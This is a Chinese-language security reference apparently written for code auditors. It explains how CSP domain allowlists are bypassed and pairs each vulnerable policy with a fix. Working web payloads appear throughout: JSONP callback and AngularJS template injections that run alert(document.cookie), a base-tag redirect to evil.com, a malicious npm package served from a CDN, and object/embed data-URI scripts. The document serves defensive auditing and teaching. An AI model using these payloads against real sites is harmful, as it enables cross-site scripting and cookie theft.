# CSP 白名单绕过（CSP Whitelist Bypass）

## 漏洞模式

CSP `script-src` 使用域名白名单限制脚本来源，但白名单中的域上存在可被攻击者利用的端点（JSONP 回调、Angular 模板、CDN 上的可控资源），导致攻击者可以绕过 CSP 执行任意脚本。

**核心原则：基于域名白名单的 CSP 只能限制脚本来源域，不能限制该域上的具体资源。如果白名单域上有任何一个端点返回攻击者可控的 JavaScript 内容，CSP 就可以被绕过。**

## CSP 策略 vs 绕过 PoC

### JSONP 端点绕过

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' https://trusted-api.com

目标域 trusted-api.com 存在 JSONP 端点：
https://trusted-api.com/api/data?callback=evil_function

绕过 payload：
<script src="https://trusted-api.com/api/data?callback=alert(document.cookie)//"></script>
→ 返回: alert(document.cookie)//({...})
→ CSP 允许（来自白名单域），浏览器执行 alert
```

```
✅ 安全方案：使用 nonce 替代域名白名单
Content-Security-Policy: script-src 'nonce-abc123'

<script src="https://trusted-api.com/api/data?callback=alert(1)//" ></script>
→ Blocked: 无 nonce 属性
```

### CDN 上的可控资源绕过

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net

攻击者在 npm 发布恶意包 evil-package，CDN 自动托管：
https://cdn.jsdelivr.net/npm/evil-package/payload.js

绕过 payload：
<script src="https://cdn.jsdelivr.net/npm/evil-package/payload.js"></script>
→ CSP 允许（白名单域），执行攻击者控制的 JS
```

```
✅ 安全方案 1：使用 SRI（Subresource Integrity）
<script src="https://cdn.jsdelivr.net/npm/trusted-lib@1.0.0/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
        crossorigin="anonymous"></script>
→ 哈希不匹配则不执行

✅ 安全方案 2：使用 nonce + strict-dynamic
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

### base-uri 未限制绕过

```
❌ 有漏洞的 CSP（缺少 base-uri）：
Content-Security-Policy: script-src 'nonce-abc123'

如果存在 HTML 注入点（不一定是 XSS）：
<base href="https://evil.com/">

页面中的相对路径脚本：
<script nonce="abc123" src="/js/app.js"></script>
→ 实际加载 https://evil.com/js/app.js（攻击者控制的脚本）
→ nonce 正确（因为是页面原有的 script 标签），CSP 通过
```

```
✅ 安全的 CSP：限制 base-uri
Content-Security-Policy: script-src 'nonce-abc123'; base-uri 'self'
```

### Angular/模板框架绕过

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com

如果白名单域托管了 Angular 1.x：
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>

Angular 模板注入绕过 CSP（不需要 unsafe-eval）：
<div ng-app ng-csp>
  {{ constructor.constructor('alert(document.cookie)')() }}
</div>
→ Angular 的模板引擎在沙箱外执行表达式
```

### object-src 未限制绕过

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self'
（未设置 object-src，继承 default-src 或无限制）

绕过 payload：
<object data="data:text/html,<script>alert(1)</script>"></object>
<embed src="data:text/html,<script>alert(1)</script>">
```

```
✅ 安全的 CSP：显式限制 object-src
Content-Security-Policy: script-src 'self'; object-src 'none'
```

## 常见可利用的白名单域

| 域 | 利用方式 | 说明 |
|----|---------|------|
| `*.googleapis.com` | 托管 Angular 1.x → 模板注入 | Google CDN 托管旧版 Angular |
| `*.cloudflare.com` / `cdnjs.cloudflare.com` | 托管有漏洞的库 | CDNJS 托管所有公开 JS 库 |
| `*.jsdelivr.net` | npm 包自动托管 | 攻击者可发布恶意 npm 包 |
| `*.unpkg.com` | npm 包自动托管 | 同上 |
| 同域 JSONP 端点 | 回调参数注入 JS | `'self'` 也可能被绕过 |
| `*.google.com` | Google Maps / Analytics JSONP | 部分端点支持回调 |

## 识别信号

| 信号 | 说明 |
|------|------|
| CSP `script-src` 使用 CDN 域名（jsdelivr / unpkg / cdnjs / googleapis） | CDN 上有攻击者可控资源 |
| CSP `script-src` 使用 API 域名 | API 域上可能有 JSONP 端点 |
| CSP 缺少 `base-uri` 限制 | `<base>` 标签注入可劫持脚本路径 |
| CSP 缺少 `object-src 'none'` | object/embed 标签可能绕过 script-src |
| CSP 使用 `'self'` 但同域有 JSONP 端点 | `'self'` 不代表安全 |
| CSP 白名单包含 Angular 1.x 托管域 | 模板注入绕过 CSP |

## 审计方法

1. **提取 CSP 策略**：从配置文件或代码中提取完整的 CSP header 值
2. **枚举白名单域**：列出 `script-src` 中的所有允许域
3. **检查每个域的 JSONP 端点**：搜索 `callback=` / `jsonp=` 参数的端点
4. **检查 CDN 域的可控性**：判断白名单 CDN 是否托管用户可发布的内容（npm 包、用户上传）
5. **检查 base-uri / object-src**：确认是否限制了这两个关键指令
6. **检查 strict-dynamic**：如果使用了 `'strict-dynamic'`，白名单域被忽略（更安全）
